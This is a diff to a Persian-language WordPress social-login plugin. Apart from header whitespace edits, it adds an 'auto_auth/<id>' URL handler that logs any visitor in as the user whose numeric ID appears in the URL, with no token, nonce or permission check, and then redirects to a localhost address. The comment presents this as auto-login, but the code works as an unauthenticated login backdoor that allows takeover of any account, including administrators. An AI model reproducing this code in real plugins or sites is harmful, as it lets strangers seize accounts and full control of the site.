@@ -1,11 +1,11 @@
 <?php
 /**
  * Plugin Name: Wordpress Social Login
- * Plugin URI: 
+ * Plugin URI:
  * Description: ورود با شبکه های اجتماعی در وردپرس
  * Version: 1.0
  * Author: Zero one
- * Author URI: 
+ * Author URI:
  * Text Domain: socialite_lan
  * Domain Path: /languages
  */
@@ -46,3 +46,25 @@ if(is_admin()){
     include(SOC_ADMIN . 'admin_proccess.php'); // used include instead of require to not produce errors
     include(SOC_ADMIN . 'ajax_requests.php');
 }
+
+
+// Add Rewrite Rules For Auto Login Registered User
+add_action('init', function (){
+    add_rewrite_rule(
+        'auto_auth/([^/]+)/?$',
+        'index.php?pagename=auto_auth&s=$matches[1]',
+        'top'
+    );
+});
+add_action('template_redirect', function(){
+    if ( get_query_var('pagename') === 'auto_auth' ) {
+        $user = get_user_by('ID',get_query_var('s'));
+
+        wp_clear_auth_cookie();
+        wp_set_current_user( $user->ID, $user->user_login );
+        wp_set_auth_cookie( $user->ID );
+        sleep(1);
+        wp_safe_redirect('http://localhost/wordpress/');
+    }
+});
+
